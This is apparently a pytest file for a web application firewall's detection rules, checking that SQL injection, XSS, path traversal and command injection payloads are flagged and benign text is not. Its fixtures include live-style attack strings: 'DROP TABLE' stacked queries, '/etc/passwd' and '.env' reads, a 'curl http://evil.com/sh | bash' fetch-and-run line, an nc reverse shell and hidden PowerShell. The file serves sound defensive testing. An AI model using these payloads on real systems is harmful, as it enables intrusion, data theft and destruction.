from app.security.models import InspectionLocation
from app.security.rules.command_injection import get_command_injection_rules
from app.security.rules.path_traversal import get_path_traversal_rules
from app.security.rules.sqli import get_sqli_rules
from app.security.rules.xss import get_xss_rules


def test_sqli_rules():
    """Verifies all SQL Injection rules on positive and negative cases."""
    rules = {r.rule_id: r for r in get_sqli_rules()}

    # SQLI-001: Tautologies
    assert rules["SQLI-001"].evaluate("' OR '1'='1", InspectionLocation.QUERY) is not None
    assert rules["SQLI-001"].evaluate("admin' OR 1=1--", InspectionLocation.QUERY) is not None
    assert rules["SQLI-001"].evaluate("normal query product 1", InspectionLocation.QUERY) is None

    # SQLI-002: UNION SELECT
    assert (
        rules["SQLI-002"].evaluate(
            "1 UNION SELECT username, password FROM users",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["SQLI-002"].evaluate(
            "1 UNION ALL SELECT 1, 2, 3",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["SQLI-002"].evaluate(
            "European Union trade report",
            InspectionLocation.QUERY,
        )
        is None
    )

    # SQLI-003: SQL Comments
    assert rules["SQLI-003"].evaluate("admin'--", InspectionLocation.QUERY) is not None
    assert rules["SQLI-003"].evaluate("admin'/* comment */", InspectionLocation.QUERY) is not None
    assert rules["SQLI-003"].evaluate("John's phone number", InspectionLocation.QUERY) is None

    # SQLI-004: Function Abuse
    assert rules["SQLI-004"].evaluate("1; SELECT sleep(5)", InspectionLocation.QUERY) is not None
    assert rules["SQLI-004"].evaluate("1 AND version()", InspectionLocation.QUERY) is not None
    assert (
        rules["SQLI-004"].evaluate(
            "I need to sleep early tonight",
            InspectionLocation.QUERY,
        )
        is None
    )

    # SQLI-005: Stacked Queries
    assert rules["SQLI-005"].evaluate("1; DROP TABLE users", InspectionLocation.QUERY) is not None
    assert (
        rules["SQLI-005"].evaluate(
            "1; DELETE FROM accounts",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["SQLI-005"].evaluate(
            "Please drop by tomorrow; thanks",
            InspectionLocation.QUERY,
        )
        is None
    )

    # SQLI-006: Unquoted Logical/Arithmetic Tautology and Time-Delay
    assert rules["SQLI-006"].evaluate("105 OR 17-7=10", InspectionLocation.QUERY) is not None
    assert rules["SQLI-006"].evaluate("105 AND 17-7=10", InspectionLocation.QUERY) is not None
    assert rules["SQLI-006"].evaluate("105 OR 5*2=10", InspectionLocation.QUERY) is not None
    assert rules["SQLI-006"].evaluate("105 OR 10-5 LIKE 5", InspectionLocation.QUERY) is not None
    assert rules["SQLI-006"].evaluate("105 OR 10!=9", InspectionLocation.QUERY) is not None
    assert rules["SQLI-006"].evaluate("WAITFOR DELAY '0:0:5'", InspectionLocation.QUERY) is not None
    assert rules["SQLI-006"].evaluate("WAITFOR TIME '23:00'", InspectionLocation.QUERY) is not None
    assert rules["SQLI-006"].evaluate("delivery in 1 or 2 days", InspectionLocation.QUERY) is None
    assert rules["SQLI-006"].evaluate("order 1 or 2 items", InspectionLocation.QUERY) is None


def test_xss_rules():
    """Verifies all XSS rules on positive and negative cases."""
    rules = {r.rule_id: r for r in get_xss_rules()}

    # XSS-001: Script tags
    assert (
        rules["XSS-001"].evaluate(
            "<script>alert('XSS')</script>",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["XSS-001"].evaluate(
            "<SCRIPT SRC=//evil.com/x.js></SCRIPT>",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["XSS-001"].evaluate(
            "Mathematical: 5 < 10 and 20 > 5",
            InspectionLocation.BODY,
        )
        is None
    )

    # XSS-002: Event handlers
    assert (
        rules["XSS-002"].evaluate(
            "<img src=x onerror=alert(1)>",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["XSS-002"].evaluate(
            "<svg onload=alert(1)>",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["XSS-002"].evaluate(
            "We are onload balance load test",
            InspectionLocation.BODY,
        )
        is None
    )

    # XSS-003: Pseudo-protocols
    assert (
        rules["XSS-003"].evaluate(
            "javascript:alert(document.cookie)",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["XSS-003"].evaluate(
            "data:text/html;base64,PHNjcmlwdD4=",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["XSS-003"].evaluate(
            "https://example.com/javascript-tutorial",
            InspectionLocation.QUERY,
        )
        is None
    )

    # XSS-004: Dangerous DOM APIs
    assert (
        rules["XSS-004"].evaluate(
            "alert(document.cookie)",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["XSS-004"].evaluate(
            "<iframe src=http://evil.com>",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["XSS-004"].evaluate(
            "Delicious chocolate cookie recipe",
            InspectionLocation.BODY,
        )
        is None
    )


def test_path_traversal_rules():
    """Verifies all Path Traversal rules on positive and negative cases."""
    rules = {r.rule_id: r for r in get_path_traversal_rules()}

    # PATH-001: Directory Traversal
    assert (
        rules["PATH-001"].evaluate(
            "../../../etc/passwd",
            InspectionLocation.PATH,
        )
        is not None
    )
    assert (
        rules["PATH-001"].evaluate(
            "..\\..\\windows\\win.ini",
            InspectionLocation.PATH,
        )
        is not None
    )
    assert (
        rules["PATH-001"].evaluate(
            "/products/apple-juice.png",
            InspectionLocation.PATH,
        )
        is None
    )

    # PATH-002: OS sensitive files
    assert (
        rules["PATH-002"].evaluate(
            "/etc/passwd",
            InspectionLocation.PATH,
        )
        is not None
    )
    assert (
        rules["PATH-002"].evaluate(
            "c:\\windows\\win.ini",
            InspectionLocation.PATH,
        )
        is not None
    )
    assert (
        rules["PATH-002"].evaluate(
            "/user/profile/settings",
            InspectionLocation.PATH,
        )
        is None
    )

    # PATH-003: App descriptors & credentials
    assert rules["PATH-003"].evaluate("/.env", InspectionLocation.PATH) is not None
    assert rules["PATH-003"].evaluate("WEB-INF/web.xml", InspectionLocation.PATH) is not None
    assert rules["PATH-003"].evaluate("/api/environment/status", InspectionLocation.PATH) is None


def test_command_injection_rules():
    """Verifies all Command Injection rules on positive and negative cases."""
    rules = {r.rule_id: r for r in get_command_injection_rules()}

    # CMD-001: Shell Metacharacters
    assert (
        rules["CMD-001"].evaluate(
            "127.0.0.1; whoami",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["CMD-001"].evaluate(
            "test | id",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["CMD-001"].evaluate(
            "normal text; greetings",
            InspectionLocation.QUERY,
        )
        is None
    )

    # CMD-002: Subshell & Backticks
    assert rules["CMD-002"].evaluate("$(whoami)", InspectionLocation.BODY) is not None
    assert rules["CMD-002"].evaluate("`id`", InspectionLocation.BODY) is not None
    assert (
        rules["CMD-002"].evaluate(
            "Price is $100 (who is buying?)",
            InspectionLocation.BODY,
        )
        is None
    )

    # CMD-003: Windows CLI & PowerShell
    assert (
        rules["CMD-003"].evaluate(
            "cmd.exe /c whoami",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["CMD-003"].evaluate(
            "powershell -enc AAAAAA",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["CMD-003"].evaluate(
            "The power of shell programming",
            InspectionLocation.QUERY,
        )
        is None
    )

    # CMD-004: Reverse Shell & Pipe
    assert (
        rules["CMD-004"].evaluate(
            "curl http://evil.com/sh | bash",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["CMD-004"].evaluate(
            "nc 10.0.0.1 4444 -e /bin/sh",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["CMD-004"].evaluate(
            "curl is a great command line tool",
            InspectionLocation.BODY,
        )
        is None
    )


def test_phase_e_fix_f2_rules_normalizer_and_body_inspection():
    """Verifies SQLI-007, CMD-006, InputNormalizer \\u00XX, duplicate JSON keys, and form bodies."""
    from app.security.engine import RuleEngine
    from app.security.normalizer import InputNormalizer

    sqli = {r.rule_id: r for r in get_sqli_rules()}
    cmd = {r.rule_id: r for r in get_command_injection_rules()}

    assert sqli["SQLI-007"].evaluate("1059e0OR 17-7=10", InspectionLocation.QUERY) is not None
    assert sqli["SQLI-007"].evaluate("CHAR(114,111,111,116)", InspectionLocation.QUERY) is not None
    assert sqli["SQLI-007"].evaluate("42 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1", InspectionLocation.QUERY) is not None
    assert sqli["SQLI-007"].evaluate("science 1e5 order summary", InspectionLocation.QUERY) is None

    assert cmd["CMD-006"].evaluate("bundle.tar && /???/c?t /???/p??s??", InspectionLocation.BODY) is not None
    assert cmd["CMD-006"].evaluate('<!--#include file="archivo_secreto" -->', InspectionLocation.BODY) is not None
    assert cmd["CMD-003"].evaluate("ws-09 & powershell -NoP -NonI -W Hidden -c whoami", InspectionLocation.BODY) is not None
    assert cmd["CMD-005"].evaluate("192.0.2.10;{c$@at,/etc/p$@asswd}", InspectionLocation.BODY) is not None
    assert cmd["CMD-006"].evaluate("/api/v3/storage/checksum?file=bundle.tar", InspectionLocation.BODY) is None

    norm = InputNormalizer.normalize(r"\u003cscript\u003ealert(1)\u003c/script\u003e")
    assert norm == "<script>alert(1)</script>"

    eng = RuleEngine()
    dup_json = b'{"comment": "42 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1", "comment": "benign_preview"}'
    assert eng.inspect_request(path="/api/v3/audit/events", body_bytes=dup_json).is_attack is True

    form_ssi = b"id=2%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E"
    assert eng.inspect_request(path="/tienda1/publico/caracteristicas.jsp", body_bytes=form_ssi).is_attack is True


def test_case_14_json_duplicate_key_tamper_powershell_direct_and_nested():
    """Verifies Case 14 (ws-09 & powershell -NoP -NonI -W Hidden -c whoami) triggers critical block
    both as direct duplicate-key JSON body and as a nested JSON string field."""
    import json

    from app.security.decision import DecisionEngine
    from app.security.engine import RuleEngine
    from app.security.models import Severity
    from app.security.risk_engine import RiskEngine

    eng = RuleEngine()
    risk_eng = RiskEngine()
    dec_eng = DecisionEngine()

    dup_payload = (
        '{"comment": "benign_preview", '
        '"comment": "ws-09 & powershell -NoP -NonI -W Hidden -c whoami"}'
    )
    direct_host_alias = (
        '{"host_alias": "benign_preview", '
        '"host_alias": "ws-09 & powershell -NoP -NonI -W Hidden -c whoami"}'
    )
    nested_json_field = json.dumps({"host_alias": dup_payload}).encode("utf-8")

    for body_bytes in (dup_payload.encode("utf-8"), direct_host_alias.encode("utf-8"), nested_json_field):
        det = eng.inspect_request(
            path="/api/v4/endpoint/inventory/sync",
            body_bytes=body_bytes,
        )
        assert det.is_attack is True
        assert det.highest_severity == Severity.CRITICAL
        assert det.rule_risk_score >= 85.0
        assert any(m.rule_id == "CMD-003" for m in det.matches)

        rb = risk_eng.calculate_weighted_score(
            rule_score=det.rule_risk_score,
            ml_score=62.6,
            anomaly_score=32.22,
            ablation_mode="hybrid",
        )
        dec = dec_eng.evaluate(risk_breakdown=rb, waf_mode="ACTIVE_BLOCKING")
        assert dec.is_blocked is True
        assert dec.risk_score >= 85.0
